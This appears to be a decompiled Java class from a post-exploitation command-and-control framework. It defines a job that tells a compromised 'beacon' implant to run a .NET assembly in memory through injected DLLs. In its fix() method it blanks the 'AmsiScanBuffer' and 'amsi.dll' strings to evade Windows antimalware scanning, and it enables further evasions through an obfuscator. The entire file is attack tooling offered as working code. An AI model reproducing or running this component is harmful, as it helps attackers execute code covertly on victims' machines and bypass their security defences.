package beacon.jobs;

import beacon.JobSimple;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import java.io.File;
import pe.PostExObfuscator;

public class ExecuteAssemblyJob extends JobSimple {
   protected String file;
   protected String args;
   protected String arch;

   public ExecuteAssemblyJob(TaskBeacon var1, String var2, String var3, String var4) {
      super(var1);
      this.file = var2;
      this.args = var3;
      this.arch = var4;
   }

   public String getDescription() {
      return this.args.length() > 0 ? "Tasked beacon to run .NET program: " + (new File(this.file)).getName() + " " + this.args : "Tasked beacon to run .NET program: " + (new File(this.file)).getName();
   }

   public boolean ignoreToken() {
      return false;
   }

   public String getShortDescription() {
      return ".NET assembly";
   }

   public String getDLLName() {
      return this.arch.equals("x86") ? "resources/invokeassembly.dll" : "resources/invokeassembly.x64.dll";
   }

   public int getWaitTime() {
      return 20000;
   }

   public byte[] getArgument() {
      byte[] var1 = CommonUtils.readFile(this.file);
      Packer var2 = new Packer();
      var2.addInt(var1.length);
      var2.append(var1);
      var2.addWideString(this.args + '\u0000');
      return var2.getBytes();
   }

   public byte[] fix(byte[] var1) {
      if (!this.tasker.disableAMSI()) {
         var1 = CommonUtils.zeroOut(var1, new String[]{"AmsiScanBuffer", "amsi.dll"});
      }

      return var1;
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
